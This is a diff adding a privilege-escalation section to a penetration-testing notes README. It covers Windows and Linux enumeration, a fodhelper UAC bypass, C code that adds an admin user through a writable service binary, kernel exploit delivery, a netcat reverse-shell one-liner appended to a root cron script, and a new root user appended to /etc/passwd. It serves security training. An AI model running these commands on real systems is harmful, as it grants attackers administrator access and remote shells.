@@ -121,6 +121,21 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Practical examples](#practical-examples)
     - [PowerShell In-Memory Injection](#powershell-in-memory-injection)
     - [Shellter](#shellter)
+- [Privilege Escalation](#privilege-escalation)
+  - [Information gathering](#information-gathering)
+    - [Tools](#tools-2)
+    - [Windows](#windows)
+    - [Linux](#linux-1)
+  - [Windows Privilege Escalation Examples](#windows-privilege-escalation-examples)
+    - [User Account Control (UAC)](#user-account-control-uac)
+    - [Insecure File Permissions](#insecure-file-permissions)
+    - [Leveraging unquoted service paths](#leveraging-unquoted-service-paths)
+    - [Windows Kernel Vulnerabilities](#windows-kernel-vulnerabilities)
+  - [Linux Privilege Escalation Examples](#windows-privilege-escalation-examples)
+    - [Understanding Linux privileges](#understanding-linux-privileges)
+    - [Insecure File Permissions: Cron](#insecure-file-permissions-cron)
+    - [Insecure File Permissions: /etc/passwd](#insecure-file-permissions-etcpasswd)
+    - [Kernel Vulnerabilities: CVE-2017-1000112](#kernel-vulnerabilities-cve-2017-1000112)
 
 ## Resources
 
@@ -2975,3 +2990,212 @@ Example of usage
    msf exploit(multi/handler) > exploit
    ```
 8. Get the meterpreter shell on the attacking machine
+
+
+## Privilege Escalation
+
+### <ins>Information gathering</ins>
+
+#### Tools
+- [PEASS-ng - Privilege Escalation Awesome Scripts SUITE new generation](https://github.com/carlospolop/PEASS-ng)
+  - [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+    - [Checklist - Local Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation) 
+  - [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+    - [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
+- [Windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
+  - `windows-privesc-check2.exe -h`
+  - `windows-privesc-check2.exe --dump -G`
+- [Unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
+  - `./unix-privesc-check`
+  - `./unix-privesc-check standard > output.txt`
+- [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)
+- [Mingw-w64](https://www.mingw-w64.org/)
+
+#### Windows
+```PowerShell
+<# gather information about current user #>
+whoami
+net user <user>
+whoami /priv
+
+<# gather user context information #>
+id
+
+<# discover other user accounts on the system #>
+net user
+
+<# enumerate the Hostname #>
+hostname
+
+<# enumerate the Operating System Version and Architecture #>
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+<# enumerate running processes and services #>
+tasklist /SVC
+
+<# enumerate networking information #>
+ipconfig /all
+route print
+netstat -ano
+
+<# enumerate firewall status and rules #>
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
+
+<# enumerate scheduled tasks #>
+schtasks /query /fo LIST /v
+
+<# enumerate installed applications and patch levels #>
+wmic product get name, version, vendor
+wmic qfe get Caption, Description, HotFixID, InstalledOn
+
+<# enumerate readable/writable files and directories #>
+accesschk.exe -uws "Everyone" "C:\Program Files"
+PS C:\> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+
+<# enumerate unmounted disks #>
+mountvol
+
+<# enumerate device drivers and Kernel modules #>
+PS C:\> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+PS C:\> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+
+<# enumerating binaries that AutoElevate #>
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+```
+
+#### Linux
+```bash
+# enumerate users
+cat /etc/passwd
+
+# enumerate the Hostname
+hostname
+
+# enumerate the Operating System Version and Architecture
+cat /etc/issue
+cat /etc/*-release
+uname -a
+
+# enumerate running processes and services
+ps axu
+
+# enumerate networking information
+ip a
+/sbin/route
+ss -anp
+
+# enumerate scheduled tasks
+ls -lah /etc/cron*
+cat /etc/crontab
+
+# enumerate installed applications and patch levels
+dpkg -l
+
+# enumerate readable/writable files and directories
+find / -writable -type d 2>/dev/null
+
+# enumerate unmounted disks
+cat /etc/fstab
+mount
+/bin/lsblk
+
+# enumerate device drivers and kernel modules
+lsmod
+/sbin/modinfo libata
+
+# enumerating binaries that AutoElevate
+find / -perm -u=s -type f 2>/dev/null
+```
+
+### <ins>Windows Privilege Escalation Examples</ins>
+
+#### User Account Control (UAC)
+
+Example:
+- Even if we are logged in as an administrative user, we must move to a high integrity level in order to change the admin user's password.
+- To do it, run the following commands
+  ```PowerShell
+  <# spawn a cmd.exe process with high integrity #>
+  powershell.exe Start-Process cmd.exe -Verb runAs
+  
+  <# successfully changing the password of the admin user after spawning cmd.exe with high integrity #>
+  whoami /groups
+  net user admin Ev!lpass
+  ```
+  
+UAC Bypass with `fodhelper.exe`, a Microsoft support application responsible for managing language changes in the operating system. Runs as high integrity on `Windows 10 1709`
+- "[First entry: Welcome and fileless UAC bypass](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)"
+- "[UAC Bypass – Fodhelper](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)"
+- `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`
+
+#### Insecure File Permissions
+
+Exploit insecure file permissions on services that run as nt authority\system
+1. List running services on Windows using PowerShell `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
+2. Notice services installed in the Program Files directory, this means that it's user-installed (for this example, Serviio)
+3. Enumerate the permissions on the target service `icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`
+   - For this scenario, any user (BUILTIN\Users) on the system has full read and write access to it
+   - See also "[Serviio PRO 1.8 DLNA Media Streaming Server - Local Privilege Escalation](https://www.exploit-db.com/exploits/41959)"
+4. Substitute `ServiioService.exe` with the following
+   ```C
+   #include <stdlib.h>
+   int main () {
+     int i;
+     i = system ("net user evil Ev!lpass /add");
+     i = system ("net localgroup administrators evil /add");
+     return 0;
+   }
+   ```
+   - `i686-w64-mingw32-gcc adduser.c -o adduser.exe`
+   - `move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"`
+   - `move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"`
+   - `dir "C:\Program Files\Serviio\bin\"`
+5. Restart the service, here's two options
+   - `net stop Serviio`
+   - Check `Startmode` of the service with `wmic service where caption="Serviio" get name, caption, state, startmode`. If it's `Auto`, it means that it will restart after a reboot. Reboot with `shutdown /r /t 0 `.
+6. Check if it worked with `net localgroup Administrators`
+
+#### Leveraging unquoted service paths
+
+"[Microsoft Windows Unquoted Service Path Vulnerability](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)"
+
+#### Windows Kernel Vulnerabilities
+
+Note: carelessness could trigger a Blue Screen of Death (BSOD) while running the exploit
+- Check the version and architecture of the target `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
+- Enumerate the drivers that are installed on the system `driverquery /v`
+
+Third-party drivers often present a more tempting attack surface. For example, target `USBPcap`.
+1. Search in the Exploit Database `searchsploit USBPcap`
+2. Learn more about the driver version with `cd "C:\Program Files\USBPcap"` and `type USBPcap.inf`
+3. Compile the exploit with `gcc 41542.c -o exploit.exe`
+4. Deliver it to the victim to execute it. Check `whoami` to make sure privilege escalation was successful.
+
+### <ins>Linux Privilege Escalation Examples</ins>
+
+#### Understanding Linux privileges
+- "Understanding and Using File Permissions | Ubuntu"
+- "File permissions and attributes | Arch Linux"
+
+
+#### Insecure File Permissions: [Cron](https://en.wikipedia.org/wiki/Cron)
+1. Inspect the cron log file `grep "CRON" /var/log/cron.log`
+2. Inspect scripts running in the context of root user, pick a target.
+3. Inspect the contents and permissions of the target script with `cat  /var/scripts/target.sh` and `ls -lah  /var/scripts/target.sh`
+4. Insert a reverse shell one-liner in `target.sh`, `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.12.0.5 4444 >/tmp/f" >> target.sh`
+   - Make sure to setup a listener with `nc -lnvp 4444`
+5. Get a root shell from the target
+
+#### Insecure File Permissions: `/etc/passwd`
+
+Linux passwords are generally stored in `/etc/passwd`. For the sake of backwards compatibility, a password hash that appears in the second column of a `/etc/passwd` user record is taken into account to be valid for authentication and, if present, supersedes the corresponding entry in `/etc/shadow`.
+
+1. Generate an hash with `openssl passwd evil`
+2. Add a new root user to `/etc/passwd` with `echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd`
+3. Test the new user with `su root2` and `id`
+
+#### Kernel Vulnerabilities: [CVE-2017-1000112](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000112)
+1. Inspect the kernel version and system architecture with `uname -r` and `arch`
+2. Use searchsploit to find kernel exploits matching the target version
